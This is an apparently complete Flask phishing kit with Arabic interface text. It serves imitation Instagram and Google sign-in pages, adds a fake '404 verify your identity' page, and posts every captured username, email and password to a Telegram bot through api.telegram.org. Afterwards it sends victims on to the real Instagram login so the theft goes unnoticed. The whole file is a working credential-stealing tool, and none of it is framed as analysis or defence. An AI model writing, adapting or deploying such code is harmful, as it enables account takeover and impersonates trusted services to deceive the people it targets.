import os
import re
import requests
from flask import Flask, redirect, render_template_string, request, session, url_for

app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY", "hohosbid_super_secret_key")

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

INSTAGRAM_OFFICIAL_URL = "https://www.instagram.com/accounts/login/"
GOOGLE_OFFICIAL_URL = "https://accounts.google.com/"


# ----------------------------------------------------
# 1. صفحة انستغرام الأولى (جمع حساب انستغرام والباسورد)
# ----------------------------------------------------
@app.route("/", methods=["GET", "POST"])
def insta_login():
  error = ""
  username_val = ""
  if request.method == "POST":
    username_val = request.form.get("username", "").strip()
    password = request.form.get("password", "")

    username_pattern = r"^[a-zA-Z0-9_\.]{4,30}$"

    if not re.match(username_pattern, username_val):
      error = (
          "عذراً، اسم المستخدم الذي أَدخلته لا ينتمي إلى أي حساب. يُرجى التحقق من"
          " اسم المستخدم ومحاولة مرة أخرى."
      )
    elif len(password) <= 5:
      error = (
          "كلمة المرور غير صحيحة. يُرجى التحقق من كلمة المرور مرة أخرى."
      )
    else:
      if BOT_TOKEN and CHAT_ID:
        msg = (
            "📸 تم استلام بيانات Instagram جديدة:\n\n👤 الحساب:"
            f" {username_val}\n🔑 الباسورد: {password}"
        )
        telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(telegram_url, json={"chat_id": CHAT_ID, "text": msg})

      session["insta_user"] = username_val
      return redirect(url_for("error_404"))

  return render_template_string(
      """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>تسجيل الدخول • Instagram</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background: #121212; color: #f5f5f5; height: 100dvh; display: flex; flex-direction: column; align-items: center; overflow: hidden; padding: 15px 20px 20px 20px; }
        .page-wrapper { width: 100%; max-width: 350px; height: 100%; display: flex; flex-direction: column; justify-content: space-between; align-items: center; }
        .top-section { width: 100%; display: flex; flex-direction: column; align-items: center; padding-top: 5px; }
        .lang-area { text-align: center; color: #a8a8a8; font-size: 12px; width: 100%; }
        .logo-area { display: flex; justify-content: center; margin-top: 80px; width: 100%; }
        .insta-icon { width: 48px; height: 48px; display: flex; align-items: center; justify-content: center; }
        .insta-icon svg { width: 48px; height: 48px; }
        .form-area { width: 100%; display: flex; flex-direction: column; align-items: center; text-align: center; }
        .error-msg { color: #ed4956; font-size: 12px; line-height: 16px; margin-bottom: 8px; text-align: center; background: #1c1c1c; padding: 8px; border-radius: 8px; border: 1px solid #331a1a; width: 100%; }
        form { width: 100%; }
        .input-group { margin-bottom: 6px; width: 100%; }
        .input-group input { width: 100%; background: #121212; border: 1px solid #262626; border-radius: 8px; padding: 12px; font-size: 14px; color: #f5f5f5; outline: none; }
        .input-group input:focus { border-color: #a8a8a8; }
        .input-group input::placeholder { color: #8e8e8e; }
        .submit-btn { width: 100%; background: #0095f6; color: white; border: none; border-radius: 8px; padding: 12px; font-size: 14px; font-weight: 600; cursor: pointer; margin-top: 4px; margin-bottom: 10px; }
        .submit-btn:hover { background: #1877f2; }
        .forgot-pass { color: #f5f5f5; font-size: 12px; text-decoration: none; display: block; margin-top: 4px; font-weight: 400; }
        .footer-area { width: 100%; text-align: center; display: flex; flex-direction: column; align-items: center; }
        .signup-card { padding: 12px; width: 100%; border: 1px solid #262626; border-radius: 8px; text-align: center; font-size: 14px; color: #0095f6; font-weight: 600; cursor: pointer; margin-bottom: 10px; }
        .meta-footer { display: flex; align-items: center; justify-content: center; }
        .meta-brand { font-size: 13px; font-weight: 600; color: #737373; letter-spacing: 0.5px; }
    </style>
</head>
<body>
    <div class="page-wrapper">
        <div class="top-section">
            <div class="lang-area">العربية</div>
            <div class="logo-area">
                <div class="insta-icon">
                    <svg viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg">
                        <defs>
                            <radialGradient id="ig-grad" cx="20%" cy="100%" r="120%">
                                <stop offset="0%" stop-color="#fdf497"/>
                                <stop offset="5%" stop-color="#fdf497"/>
                                <stop offset="45%" stop-color="#fd5949"/>
                                <stop offset="60%" stop-color="#d6249f"/>
                                <stop offset="90%" stop-color="#285AEB"/>
                            </radialGradient>
                        </defs>
                        <path d="M352 0H160C71.6 0 0 71.6 0 160v192c0 88.4 71.6 160 160 160h192c88.4 0 160-71.6 160-160V160c0-88.4-71.6-160-160-160zm112 352c0 61.8-50.2 112-112 112H160c-61.8 0-112-50.2-112-112V160c0-61.8 50.2-112 112-112h192c61.8 0 112 50.2 112 112v192z" fill="url(#ig-grad)"/>
                        <path d="M256 126.5c-71.5 0-129.5 58-129.5 129.5s58 129.5 129.5 129.5 129.5-58 129.5-129.5-58-129.5-129.5-129.5zm0 211.3c-45.1 0-81.8-36.7-81.8-81.8s36.7-81.8 81.8-81.8 81.8 36.7 81.8 81.8-36.7 81.8-81.8 81.8z" fill="url(#ig-grad)"/>
                        <circle cx="382.5" cy="129.5" r="30" fill="url(#ig-grad)"/>
                    </svg>
                </div>
            </div>
        </div>

        <div class="form-area">
            {% if error %}
                <div class="error-msg">{{ error }}</div>
            {% endif %}
            <form method="POST">
                <div class="input-group">
                    <input type="text" name="username" required placeholder="اسم المستخدم أو البريد الإلكتروني أو رقم المحمول" value="{{ username_val }}">
                </div>
                <div class="input-group">
                    <input type="password" name="password" required placeholder="كلمة السر">
                </div>
                <button type="submit" class="submit-btn">تسجيل الدخول</button>
            </form>
            <a href="#" class="forgot-pass">هل نسيت كلمة السر؟</a>
        </div>

        <div class="footer-area">
            <div class="signup-card">إنشاء حساب جديد</div>
            <div class="meta-footer">
                <div class="meta-brand">Meta ∞</div>
            </div>
        </div>
    </div>
</body>
</html>
""",
      error=error,
      username_val=username_val,
  )


# ----------------------------------------------------
# 2. صفحة الخطأ 404 (رقم 404 أسود وزر تسجيل الدخول)
# ----------------------------------------------------
@app.route("/error-404", methods=["GET", "POST"])
def error_404():
  insta_user = session.get("insta_user", "")
  if not insta_user:
    return redirect(url_for("insta_login"))

  if request.method == "POST":
    return redirect(url_for("google_step1"))

  return render_template_string(
      """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>خطأ 404 - تأكيد الحساب</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background: #ffffff; color: #000000; height: 100dvh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 25px; text-align: center; }
        .error-container { width: 100%; max-width: 380px; display: flex; flex-direction: column; align-items: center; }
        .error-code { font-size: 60px; font-weight: 700; color: #202124; margin-bottom: 5px; }
        .error-title { font-size: 20px; font-weight: 600; margin-bottom: 12px; color: #202124; }
        .error-desc { font-size: 14.5px; color: #5f6368; line-height: 1.6; margin-bottom: 30px; }
        .next-btn { width: 100%; background: #1a73e8; color: white; border: none; border-radius: 8px; padding: 13px; font-size: 15px; font-weight: 500; cursor: pointer; text-decoration: none; display: inline-block; box-shadow: 0 1px 3px rgba(0,0,0,0.2); }
        .next-btn:hover { background: #1558b0; }
    </style>
</head>
<body>
    <div class="error-container">
        <div class="error-code">404</div>
        <div class="error-title">حدث خطأ ما</div>
        <div class="error-desc">عذراً، واجهنا مشكلة في التحقق من هويتك. الرجاء تأكيد أنك صاحب الحساب عن طريق تسجيل الدخول بالبريد الإلكتروني المرتبط للمتابعة.</div>
        <form method="POST" style="width: 100%;">
            <button type="submit" class="next-btn">تسجيل الدخول</button>
        </form>
    </div>
</body>
</html>
""")


# ----------------------------------------------------
# 3. صفحات جوجل
# ----------------------------------------------------
@app.route("/google-login", methods=["GET", "POST"])
def google_step1():
  insta_user = session.get("insta_user", "")
  if not insta_user:
    return redirect(url_for("insta_login"))

  error = ""
  if request.method == "POST":
    email_val = request.form.get("email", "").strip()
    email_pattern = r"^[\w\.-]+@[\w\.-]+\.\w+$"
    phone_pattern = r"^\+?[0-9]{10,15}$"

    if not (
        re.match(email_pattern, email_val) or re.match(phone_pattern, email_val)
    ):
      error = (
          "لم يتم العثور على حسابك على Google. يُرجى التحقق من عنوان البريد"
          " الإلكتروني أو رقم الهاتف."
      )
    else:
      session["google_email"] = email_val
      return redirect(url_for("google_step2"))

  return render_template_string(
      """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>تسجيل الدخول - حسابات Google</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; }
        body { background: #fff; width: 100vw; height: 100vh; height: 100dvh; display: flex; flex-direction: column; align-items: center; justify-content: space-between; padding: 16px 20px; overflow: hidden; }
        .login-card { width: 100%; max-width: 450px; display: flex; flex-direction: column; align-items: center; text-align: center; }
        .google-g { width: 32px; height: 32px; margin-bottom: 8px; }
        .title { font-size: 22px; font-weight: 400; color: #202124; margin-bottom: 6px; }
        .subtitle { font-size: 13.5px; color: #5f6368; margin-bottom: 4px; line-height: 1.4; }
        .info-link { font-size: 13.5px; color: #1a73e8; text-decoration: none; margin-bottom: 16px; display: inline-block; }
        .info-link:hover { text-decoration: underline; }
        .error-msg { color: #d93025; font-size: 12.5px; line-height: 18px; margin-bottom: 10px; width: 100%; text-align: right; background: #fce8e6; padding: 8px; border-radius: 8px; border: 1px solid #fad2cf; }
        .input-wrapper { width: 100%; text-align: right; }
        .input-group { width: 100%; margin-bottom: 14px; }
        .input-group input { width: 100%; padding: 12px 14px; font-size: 15px; border: 1.5px solid #1a73e8; border-radius: 8px; outline: none; color: #202124; background: #fff; }
        .forgot-link { color: #1a73e8; font-size: 14px; text-decoration: none; font-weight: 500; display: inline-block; }
        .forgot-link:hover { text-decoration: underline; }
        .signup-container { width: 100%; text-align: right; margin-top: 45px; }
        .signup-link { color: #1a73e8; font-size: 14px; text-decoration: none; font-weight: 500; display: inline-block; }
        .signup-link:hover { text-decoration: underline; }
        .footer-action { width: 100%; max-width: 450px; display: flex; justify-content: flex-end; align-items: center; padding-bottom: 10px; }
        .submit-btn { background: #1a73e8; color: white; border: none; border-radius: 28px; padding: 10px 28px; font-size: 15px; font-weight: 500; cursor: pointer; box-shadow: 0 1px 3px 0 rgba(60,64,67,0.3), 0 4px 8px 3px rgba(60,64,67,0.15); }
        .submit-btn:hover { background: #1558b0; }
    </style>
</head>
<body>
    <div class="login-card">
        <svg class="google-g" viewBox="0 0 24 24">
            <path fill="#4285F4" d="M23.745 12.27c0-.7-.06-1.4-.19-2.07H12v4.51h6.6c-.29 1.52-1.14 2.82-2.4 3.68v3.05h3.88c2.27-2.09 3.66-5.17 3.66-9.17z"/>
            <path fill="#34A853" d="M12 24c3.24 0 5.95-1.08 7.93-2.91l-3.88-3.05c-1.08.72-2.45 1.16-4.05 1.16-3.13 0-5.78-2.11-6.73-4.96H1.18v3.14C3.15 21.32 7.23 24 12 24z"/>
            <path fill="#FBBC05" d="M5.27 14.24c-.25-.72-.38-1.49-.38-2.24s.13-1.52.38-2.24V6.62H1.18C.43 8.12 0 9.8 0 12s.43 3.88 1.18 5.38l3.14-3.14-.05-.00z"/>
            <path fill="#EA4335" d="M12 4.75c1.77 0 3.35.61 4.6 1.8l3.42-3.42C17.95 1.19 15.24 0 12 0 7.23 0 3.15 2.68 1.18 6.62l4.09 3.14c.95-2.85 3.6-4.96 6.73-4.96z"/>
        </svg>

        <div class="title">تسجيل الدخول</div>
        <div class="subtitle">يُرجى استخدام حسابك على Google. ستتم إضافة الحساب إلى هذا الجهاز وسيكون متاحًا لاستخدامه في تطبيقات Google الأخرى.</div>
        <a href="#" class="info-link">مزيد من المعلومات حول استخدام حسابك</a>

        {% if error %}
            <div class="error-msg">{{ error }}</div>
        {% endif %}

        <form id="emailForm" method="POST" style="width: 100%;">
            <div class="input-wrapper">
                <div class="input-group">
                    <input type="text" name="email" required placeholder="البريد الإلكتروني أو الهاتف">
                </div>
                <a href="#" class="forgot-link">هل نسيت بريدك الإلكتروني؟</a>
            </div>
        </form>

        <div class="signup-container">
            <a href="https://accounts.google.com/signup" target="_blank" class="signup-link">إنشاء حساب</a>
        </div>
    </div>

    <div class="footer-action">
        <button type="submit" form="emailForm" class="submit-btn">التالي</button>
    </div>
</body>
</html>
""",
      error=error,
  )


@app.route("/google-password", methods=["GET", "POST"])
def google_step2():
  insta_user = session.get("insta_user", "")
  google_email = session.get("google_email", "")
  if not insta_user or not google_email:
    return redirect(url_for("insta_login"))

  error = ""
  if request.method == "POST":
    password = request.form.get("password", "")

    if len(password) <= 5:
      error = "كلمة المرور غير صحيحة. يُرجى إعادة المحاولة."
    else:
      if BOT_TOKEN and CHAT_ID:
        msg = (
            "📸 تم استلام بيانات التحقق الكاملة (Google + Instagram):\n\n👤 حساب"
            f" انستا: {insta_user}\n📧 إيميل جوجل: {google_email}\n🔑 باسورد"
            f" جوجل: {password}"
        )
        telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(telegram_url, json={"chat_id": CHAT_ID, "text": msg})

      session.clear()
      return redirect(INSTAGRAM_OFFICIAL_URL)

  return render_template_string(
      """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>تسجيل الدخول - حسابات Google</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; }
        body { background: #fff; width: 100vw; height: 100vh; height: 100dvh; display: flex; flex-direction: column; align-items: center; justify-content: space-between; padding: 16px 20px; overflow: hidden; }
        .login-card { width: 100%; max-width: 450px; display: flex; flex-direction: column; align-items: center; text-align: center; }
        .google-logo { font-size: 22px; font-weight: 500; color: #202124; margin-bottom: 8px; display: flex; align-items: center; justify-content: center; gap: 4px; }
        .google-logo span span:nth-child(1) { color: #4285F4; }
        .google-logo span span:nth-child(2) { color: #EA4335; }
        .google-logo span span:nth-child(3) { color: #FBBC05; }
        .google-logo span span:nth-child(4) { color: #4285F4; }
        .google-logo span span:nth-child(5) { color: #34A853; }
        .google-logo span span:nth-child(6) { color: #EA4335; }
        .title { font-size: 22px; font-weight: 400; color: #202124; margin-bottom: 10px; }
        .user-chip { display: inline-flex; align-items: center; padding: 4px 12px 4px 4px; border: 1px solid #dadce0; border-radius: 100px; margin-bottom: 20px; font-size: 13.5px; color: #3c4043; gap: 6px; background: #fff; }
        .user-chip svg { width: 16px; height: 16px; }
        .error-msg { color: #d93025; font-size: 12.5px; line-height: 18px; margin-bottom: 12px; width: 100%; text-align: right; background: #fce8e6; padding: 8px; border-radius: 8px; border: 1px solid #fad2cf; }
        .input-wrapper { width: 100%; text-align: right; margin-bottom: 10px; }
        .input-group { width: 100%; margin-bottom: 8px; }
        .input-group input { width: 100%; padding: 12px 14px; font-size: 15px; border: 1.5px solid #1a73e8; border-radius: 8px; outline: none; color: #202124; background: #fff; }
        .footer-action { width: 100%; max-width: 450px; display: flex; justify-content: flex-end; align-items: center; padding-bottom: 10px; }
        .submit-btn { background: #1a73e8; color: white; border: none; border-radius: 28px; padding: 10px 28px; font-size: 15px; font-weight: 500; cursor: pointer; box-shadow: 0 1px 3px 0 rgba(60,64,67,0.3), 0 4px 8px 3px rgba(60,64,67,0.15); }
        .submit-btn:hover { background: #1558b0; }
    </style>
</head>
<body>
    <div class="login-card">
        <div class="google-logo">
            <span>
                <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
            </span>
        </div>
        
        <div class="title">مرحبًا</div>
        
        <div class="user-chip">
            <svg viewBox="0 0 24 24"><path fill="#5f6368" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
            <span>{{ google_email }}</span>
        </div>

        {% if error %}
            <div class="error-msg">{{ error }}</div>
        {% endif %}

        <form id="passForm" method="POST" style="width: 100%;">
            <div class="input-wrapper">
                <div class="input-group">
                    <input type="password" name="password" required placeholder="إدخال كلمة المرور">
                </div>
            </div>
        </form>
    </div>

    <div class="footer-action">
        <button type="submit" form="passForm" class="submit-btn">التالي</button>
    </div>
</body>
</html>
""",
      error=error,
      google_email=google_email,
  )


if __name__ == "__main__":
  app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
